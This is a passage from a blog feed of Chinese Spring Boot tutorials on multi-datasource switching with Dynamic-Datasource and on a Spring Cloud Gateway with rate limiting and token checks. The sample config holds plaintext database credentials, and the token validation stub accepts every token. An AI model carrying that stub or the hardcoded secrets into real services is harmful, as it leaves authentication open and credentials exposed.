class="number">3</span>) + <span class="string">&quot;******&quot;</span> + dbPassword.substring(dbPassword.length() - <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;密码解密成功&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>适用场景</p>
</blockquote>
<ul>
<li>需要更灵活的自定义敏感数据加解密逻辑</li>
<li>需要对接企业内部密钥管理系统（如从数据库&#x2F;接口获取密钥）</li>
<li>需要更细粒度的解密控制（如按配置项类型解密）</li>
</ul>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot集成八【多数据源Dynamic-Datasource框架】</title>
    <url>/cnblogs.github.io/p/c546.html</url>
    <content><![CDATA[<p><strong>Dynamic-Datasource 引入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 适合 SpringBoot 1.5.x + 2.x 版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dynamic-datasource-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 适合 SpringBoot 3.x 版本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dynamic-datasource-spring-boot3-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>Dynamic-Datasource+Mybatis使用方法</p>
</blockquote>
<p><strong>maven引入</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>dynamic-datasource-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>tk.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mapper-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>配置好数据源</strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">dynamic:</span></span><br><span class="line">      <span class="attr">primary:</span> <span class="string">master1</span></span><br><span class="line">      <span class="attr">strict:</span> <span class="literal">false</span></span><br><span class="line">      <span class="attr">datasource:</span></span><br><span class="line">        <span class="attr">master1:</span></span><br><span class="line">          <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/master1?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;autoReconnect=true&amp;failOverReadOnly=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">andrew</span></span><br><span class="line">          <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">        <span class="attr">master2:</span></span><br><span class="line">          <span class="attr">url:</span> <span class="string">jdbc:mysql://127.0.0.1:3306/master2?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;autoReconnect=true&amp;failOverReadOnly=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">andrew</span></span><br><span class="line">          <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">        <span class="attr">master3:</span></span><br><span class="line">          <span class="attr">url:</span> <span class="string">jdbc:oracle:thin:@10.132.212.63:1688:TESTDB</span></span><br><span class="line">          <span class="attr">username:</span> <span class="string">flx</span></span><br><span class="line">          <span class="attr">password:</span> <span class="string">flx202108</span></span><br><span class="line">          <span class="attr">driver-class-name:</span> <span class="string">oracle.jdbc.OracleDriver</span></span><br><span class="line"></span><br><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="attr">com.xkcoding:</span> <span class="string">debug</span></span><br><span class="line">    <span class="attr">com.xkcoding.orm.mybatis.mapper:</span> <span class="string">trace</span></span><br><span class="line"></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="comment">#  servlet:</span></span><br><span class="line"><span class="comment">#    context-path: /demo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">mybatis:</span></span><br><span class="line">  <span class="attr">type-aliases-package:</span> <span class="string">com.orm.mybatis.dsannotation.entity</span></span><br><span class="line">  <span class="attr">mapper-locations:</span> <span class="string">classpath:mapper/*/*.xml</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p><strong>service层</strong><br>里面在想要切换数据源的方法上加上@DS注解就行了，也可以加在整个service层上，方法上的注解优先于类上注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper1 userMapper1;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper2 userMapper2;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> AsusPoInfoMapper3 asusPoInfoMapper3;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DS(&quot;master1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAllUser</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; list = userMapper1.selectAllUser();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DS(&quot;master2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAllUser1</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; list = userMapper2.selectAllUser();</span><br><span class="line">        <span class="keyword">return</span> list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> User <span class="title function_">findUserById</span><span class="params">(Long id)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> userMapper1.selectUserById(id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span>  <span class="comment">//与dynamic不同的是，这两个注解可以一起使用会先切换数据源再事务</span></span><br><span class="line">    <span class="meta">@DS(&quot;master1&quot;)</span>  <span class="comment">//与dynamic不同的是，这两个注解可以一起使用会先切换数据源再事务</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertUser1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">date</span> <span class="operator">=</span>  simpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        <span class="type">String</span> <span class="variable">UUID</span> <span class="operator">=</span> java.util.UUID.randomUUID().toString().substring(<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> User.builder().email(<span class="string">&quot;andrew@qq.com&quot;</span>+UUID).name(<span class="string">&quot;andrew&quot;</span>+UUID).password(<span class="string">&quot;123456&quot;</span>+UUID).phoneNumber(<span class="string">&quot;123&quot;</span>+UUID)</span><br><span class="line">                .lastUpdateTime(date).createTime(date).status(<span class="number">0</span>).salt(<span class="string">&quot;password&quot;</span>+UUID).build();</span><br><span class="line">        userMapper1.saveUser(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@DS(&quot;master2&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertUser2</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">date</span> <span class="operator">=</span>  simpleDateFormat.format(<span class="keyword">new</span> <span class="title class_">Date</span>());</span><br><span class="line">        <span class="type">String</span> <span class="variable">UUID</span> <span class="operator">=</span> java.util.UUID.randomUUID().toString().substring(<span class="number">0</span>,<span class="number">5</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> User.builder().email(<span class="string">&quot;andrew@qq.com&quot;</span>+UUID).name(<span class="string">&quot;andrew&quot;</span>+UUID).password(<span class="string">&quot;123456&quot;</span>+UUID).phoneNumber(<span class="string">&quot;123&quot;</span>+UUID)</span><br><span class="line">                .lastUpdateTime(date).createTime(date).status(<span class="number">0</span>).salt(<span class="string">&quot;password&quot;</span>+UUID).build();</span><br><span class="line">        userMapper2.saveUser(user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testTransitional</span><span class="params">()</span> &#123;</span><br><span class="line">        ((UserServiceImpl)AopContext.currentProxy()).insertUser1();</span><br><span class="line">        ((UserServiceImpl)AopContext.currentProxy()).insertUser2();</span><br><span class="line">        ((UserServiceImpl)AopContext.currentProxy()).insertOracle();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DS(&quot;master3&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;AsusPoInfo&gt; <span class="title function_">selectOracle</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> asusPoInfoMapper3.selectAllAsusPoInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@DS(&quot;master3&quot;)</span><span class="comment">//与dynamic不同的是，这两个注解可以一起使用会先切换数据源再事务</span></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertOracle</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">AsusPoInfo</span> <span class="variable">asusPoInfo</span> <span class="operator">=</span> AsusPoInfo.builder().id(java.util.UUID.randomUUID().toString().substring(<span class="number">0</span>,<span class="number">20</span>))</span><br><span class="line">                .woNo(<span class="string">&quot;andrew&quot;</span>).po(<span class="string">&quot;123456&quot;</span>).poLine(<span class="string">&quot;poline&quot;</span>).cPo(<span class="string">&quot;cpo123456&quot;</span>).shipType(<span class="string">&quot;Direct&quot;</span>).build();</span><br><span class="line">        asusPoInfoMapper3.insertAsusPoInfo(asusPoInfo);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>测试多数据源回滚</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.orm.mybatis.dsannotation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.orm.mybatis.dsannotation.entity.AsusPoInfo;</span><br><span class="line"><span class="keyword">import</span> com.orm.mybatis.dsannotation.entity.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"><span class="keyword">import</span> com.orm.mybatis.dsannotation.serviceImpl.UserServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SpringbootMybatisDsannotationDatasourceApplicationTests</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//事务测试</span></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserServiceImpl userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads1</span><span class="params">()</span> &#123;</span><br><span class="line">     List&lt;AsusPoInfo&gt; list = userService.selectOracle();</span><br><span class="line">     System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads2</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;User&gt; list = userService.findAllUser();</span><br><span class="line">        System.out.println(list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads3</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;User&gt; list = userService.findAllUser();</span><br><span class="line">        List&lt;User&gt; list1 = userService.findAllUser1();</span><br><span class="line">        List&lt;AsusPoInfo&gt; list2 = userService.selectOracle();</span><br><span class="line">        list.addAll(list1);</span><br><span class="line">        System.out.println(list);</span><br><span class="line">        System.out.println(list2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">contextLoads4</span><span class="params">()</span> &#123;</span><br><span class="line">        userService.testTransitional();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>切换数据源成功，而且事务能回滚，但如果是多数据源事务，只能回滚报错的数据源的事务。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringCloud分布式功能一【Gateway网关统一管理】</title>
    <url>/cnblogs.github.io/p/4353.html</url>
    <content><![CDATA[<p><strong>创建网关模块并配置依赖</strong><br>想要将多个 Spring Boot 3 应用接入网关进行统一管理，第一步就是创建一个网关模块。以 Maven 项目为例，在pom.xml文件中添加如下依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Spring Cloud Gateway 核心依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 如果使用Nacos作为服务注册中心，添加Nacos依赖 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-alibaba-nacos-discovery<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>添加完依赖后，在项目的启动类上，添加@EnableDiscoveryClient注解，开启服务注册与发现功能。假设启动类名为GatewayApplication，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.client.discovery.EnableDiscoveryClient;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableDiscoveryClient</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GatewayApplication</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(GatewayApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果项目使用 Nacos 等服务注册中心，还需要在application.yml文件中配置 Nacos 的相关信息，例如：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">gateway-service</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">nacos:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">server-addr:</span> <span class="string">localhost:8848</span> <span class="comment"># Nacos服务器地址</span></span><br></pre></td></tr></table></figure>
<p>这样，网关模块就能注册到 Nacos 中，并且感知到其他已注册的 Spring Boot 3 应用服务。</p>
<p><strong>路由配置详解</strong><br>接着，在配置文件中进行关键的路由配置。我们要开启从注册中心动态创建路由的功能，在application.yml文件的spring.cloud.gateway节点下进行配置。在routes配置中，为每个路由指定一个唯一的id ，比如可以采用 “服务名 + route” 的形式；uri则填写对应的服务名称，这样即使服务的实际 IP 地址发生变化，也无需重新配置网关；predicates部分用于配置服务中controller的路由规则，确保请求能够准确地转发到对应的应用接口上。<br>例如，我们有一个名为user-service的用户服务，想要将所有以&#x2F;user&#x2F;开头的请求转发到该服务上，配置如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">discovery:</span></span><br><span class="line">        <span class="attr">locator:</span></span><br><span class="line">          <span class="attr">enabled:</span> <span class="literal">true</span> <span class="comment"># 开启从注册中心动态创建路由的功能</span></span><br><span class="line">          <span class="attr">lowerCaseServiceId:</span> <span class="literal">true</span> <span class="comment"># 将服务ID转换为小写</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">user-service-route</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">lb://user-service</span> <span class="comment"># lb表示基于负载均衡，指向user-service服务</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/user/**</span> <span class="comment"># 匹配所有以/user/开头的请求路径</span></span><br></pre></td></tr></table></figure>
<p>如果希望根据请求头中的信息进行路由，比如只有请求头中包含X-User-Type: admin的请求才转发到特定服务，可以这样配置：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">id:</span> <span class="string">admin-service-route</span></span><br><span class="line">    <span class="attr">uri:</span> <span class="string">lb://admin-service</span></span><br><span class="line">    <span class="attr">predicates:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Header=X-User-Type,</span> <span class="string">admin</span></span><br></pre></td></tr></table></figure>
<p><strong>功能实现：限流防刷与登录鉴权</strong><br>在功能实现方面，限流防刷是必不可少的一环。我们可以借助 Redis 来实现，通过编写过滤器，设定某个 IP 在一定时间内的访问次数上限，一旦超过这个次数，就限制该 IP 的访问，从而有效防止恶意攻击和流量暴增对系统造成的冲击。<br>首先，引入 Redis 依赖：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后，编写一个自定义的限流过滤器RateLimitingFilter，代码示例如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.RedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.Duration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RateLimitingFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;rate_limit:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> RedisTemplate&lt;String, Integer&gt; redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RateLimitingFilter</span><span class="params">(RedisTemplate&lt;String, Integer&gt; redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> exchange.getRequest().getRemoteAddress().getAddress().getHostAddress();</span><br><span class="line">        <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> KEY_PREFIX + ip;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取当前IP的访问次数</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">        <span class="keyword">if</span> (count == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 首次访问，设置初始值为1，过期时间为1分钟</span></span><br><span class="line">            redisTemplate.opsForValue().set(key, <span class="number">1</span>, Duration.ofMinutes(<span class="number">1</span>));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (count &lt; <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// 访问次数未超过限制，次数加1</span></span><br><span class="line">            redisTemplate.opsForValue().increment(key);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 访问次数超过限制，返回429 Too Many Requests</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.TOO_MANY_REQUESTS);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>; <span class="comment">// 过滤器执行顺序，数值越小越先执行</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>登录鉴权也是保障系统安全的重要措施，通常采用无状态的做法，前端在请求时携带token，网关通过过滤器对token进行校验，确保请求的合法性。<br>创建一个TokenValidationFilter过滤器，代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TokenValidationFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> exchange.getRequest().getHeaders().getFirst(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (token == <span class="literal">null</span> ||!isValidToken(token)) &#123;</span><br><span class="line">            <span class="comment">// token无效，返回401 Unauthorized</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isValidToken</span><span class="params">(String token)</span> &#123;</span><br><span class="line">        <span class="comment">// 这里可以实现具体的token校验逻辑，例如调用认证服务进行校验</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 过滤器执行顺序</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同时，我们还需要对一些不需要鉴权的接口，如登录接口进行放行处理，这可以通过在配置文件中进行声明，并编写对应的配置类来实现。比如，在配置文件中定义一个不需要鉴权的路径列表:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">auth:</span></span><br><span class="line">  <span class="attr">ignore:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">/user/login</span></span><br></pre></td></tr></table></figure>
<p>然后编写配置类读取这些路径，并在过滤器中进行判断：</p>
